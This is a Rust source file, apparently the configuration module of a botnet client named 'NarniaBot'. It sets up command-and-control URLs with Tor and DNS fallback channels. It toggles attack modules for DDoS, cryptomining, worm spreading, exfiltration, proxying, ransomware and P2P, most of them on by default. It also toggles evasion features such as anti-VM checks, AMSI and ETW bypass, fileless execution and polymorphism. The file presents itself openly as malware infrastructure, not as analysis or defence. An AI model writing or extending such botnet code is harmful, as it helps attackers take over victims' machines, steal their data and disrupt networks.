use serde::{Deserialize, Serialize};
use config::{Config, ConfigError, File};
use std::env;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BotConfig {
    pub bot: BotSettings,
    pub c2: C2Settings,
    pub modules: ModuleSettings,
    pub security: BotSecuritySettings,
    pub network: NetworkSettings,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BotSettings {
    pub id: Option<String>, // Auto-generated if not provided
    pub name: String,
    pub version: String,
    pub checkin_interval_seconds: u64,
    pub max_retry_attempts: u32,
    pub retry_delay_seconds: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct C2Settings {
    pub primary_url: String,
    pub backup_urls: Vec<String>,
    pub tor_enabled: bool,
    pub tor_proxy: Option<String>,
    pub dns_enabled: bool,
    pub dns_domain: Option<String>,
    pub encryption_enabled: bool,
    pub encryption_key: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ModuleSettings {
    pub ddos_enabled: bool,
    pub mining_enabled: bool,
    pub worm_enabled: bool,
    pub proxy_enabled: bool,
    pub exfil_enabled: bool,
    pub ransomware_enabled: bool,
    pub p2p_enabled: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BotSecuritySettings {
    pub anti_vm_enabled: bool,
    pub etw_bypass_enabled: bool,
    pub amsi_bypass_enabled: bool,
    pub fileless_execution: bool,
    pub polymorphic_enabled: bool,
    pub self_delete_on_detection: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NetworkSettings {
    pub user_agent: String,
    pub timeout_seconds: u64,
    pub max_connections: usize,
    pub proxy_socks5_addr: Option<String>,
    pub p2p_listen_port: u16,
    pub p2p_bootstrap_peers: Vec<String>,
}

impl Default for BotConfig {
    fn default() -> Self {
        Self {
            bot: BotSettings::default(),
            c2: C2Settings::default(),
            modules: ModuleSettings::default(),
            security: BotSecuritySettings::default(),
            network: NetworkSettings::default(),
        }
    }
}

impl Default for BotSettings {
    fn default() -> Self {
        Self {
            id: None,
            name: "NarniaBot".to_string(),
            version: env!("CARGO_PKG_VERSION").to_string(),
            checkin_interval_seconds: 30,
            max_retry_attempts: 3,
            retry_delay_seconds: 10,
        }
    }
}

impl Default for C2Settings {
    fn default() -> Self {
        Self {
            primary_url: "http://localhost:8000".to_string(),
            backup_urls: vec![],
            tor_enabled: false,
            tor_proxy: None,
            dns_enabled: false,
            dns_domain: None,
            encryption_enabled: false,
            encryption_key: None,
        }
    }
}

impl Default for ModuleSettings {
    fn default() -> Self {
        Self {
            ddos_enabled: true,
            mining_enabled: true,
            worm_enabled: true,
            proxy_enabled: true,
            exfil_enabled: true,
            ransomware_enabled: false, // Disabled by default for safety
            p2p_enabled: true,
        }
    }
}

impl Default for BotSecuritySettings {
    fn default() -> Self {
        Self {
            anti_vm_enabled: true,
            etw_bypass_enabled: false, // Windows-specific
            amsi_bypass_enabled: false, // Windows-specific
            fileless_execution: false,
            polymorphic_enabled: false,
            self_delete_on_detection: false,
        }
    }
}

impl Default for NetworkSettings {
    fn default() -> Self {
        Self {
            user_agent: format!("NarniaBot/{}", env!("CARGO_PKG_VERSION")),
            timeout_seconds: 30,
            max_connections: 10,
            proxy_socks5_addr: None,
            p2p_listen_port: 8081,
            p2p_bootstrap_peers: vec![],
        }
    }
}

impl BotConfig {
    pub fn load() -> Result<Self, ConfigError> {
        // Load .env file if it exists
        dotenvy::dotenv().ok();

        let mut builder = Config::builder()
            .add_source(File::with_name("config/default").required(false))
            .add_source(File::with_name("config/bot").required(false))
            .add_source(config::Environment::with_prefix("BOT"));

        // Override with environment variables
        if let Ok(c2_url) = env::var("C2_URL") {
            builder = builder.set_override("c2.primary_url", c2_url)?;
        }

        if let Ok(bot_id) = env::var("BOT_ID") {
            builder = builder.set_override("bot.id", bot_id)?;
        }

        if let Ok(tor_enabled) = env::var("TOR_ENABLED") {
            if let Ok(enabled) = tor_enabled.parse::<bool>() {
                builder = builder.set_override("c2.tor_enabled", enabled)?;
            }
        }

        if let Ok(dns_enabled) = env::var("DNS_ENABLED") {
            if let Ok(enabled) = dns_enabled.parse::<bool>() {
                builder = builder.set_override("c2.dns_enabled", enabled)?;
            }
        }

        if let Ok(checkin_interval) = env::var("CHECKIN_INTERVAL") {
            if let Ok(interval) = checkin_interval.parse::<u64>() {
                builder = builder.set_override("bot.checkin_interval_seconds", interval)?;
            }
        }

        builder.build()?.try_deserialize()
    }

    pub fn validate(&self) -> Result<(), String> {
        // Validate C2 settings
        if self.c2.primary_url.is_empty() {
            return Err("Primary C2 URL cannot be empty".to_string());
        }

        if !self.c2.primary_url.starts_with("http") {
            return Err("C2 URL must start with http:// or https://".to_string());
        }

        // Validate bot settings
        if let Some(ref bot_id) = self.bot.id {
            if bot_id.is_empty() {
                return Err("Bot ID cannot be empty if provided".to_string());
            }
        }

        // Validate network settings
        if self.network.timeout_seconds == 0 {
            return Err("Network timeout cannot be 0".to_string());
        }

        // Validate security settings
        if self.c2.encryption_enabled && self.c2.encryption_key.as_ref().map_or(true, |k| k.len() < 16) {
            return Err("Encryption key must be at least 16 characters when encryption is enabled".to_string());
        }

        Ok(())
    }

    pub fn generate_bot_id(&mut self) {
        if self.bot.id.is_none() {
            use rand::Rng;
            let id = format!("{:x}", rand::thread_rng().gen::<u64>());
            self.bot.id = Some(id);
        }
    }

    pub fn get_bot_id(&self) -> &str {
        self.bot.id.as_deref().unwrap_or("unknown")
    }

    pub fn is_module_enabled(&self, module: &str) -> bool {
        match module {
            "ddos" => self.modules.ddos_enabled,
            "mining" => self.modules.mining_enabled,
            "worm" => self.modules.worm_enabled,
            "proxy" => self.modules.proxy_enabled,
            "exfil" => self.modules.exfil_enabled,
            "ransomware" => self.modules.ransomware_enabled,
            "p2p" => self.modules.p2p_enabled,
            _ => false,
        }
    }

    pub fn get_c2_urls(&self) -> Vec<String> {
        let mut urls = vec![self.c2.primary_url.clone()];
        urls.extend(self.c2.backup_urls.clone());
        urls
    }
}
